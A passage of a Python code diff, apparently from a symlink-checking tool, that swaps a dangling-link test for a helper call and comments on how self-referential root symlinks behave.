             warns.append(f"{rel} -> {safe_real} [{sclass}, stays in-tree]")
-        elif not real.exists():  # follows the link: False == dangling (or ELOOP: a
+        elif not pathprobe.exists(real):  # follows the link: False == dangling (or ELOOP: a
             # self-referential root symlink resolves to itself via non-strict realpath
             # without raising, then fails .exists() the same way a dangling link does --
             # disclosed here, never silently dropped)
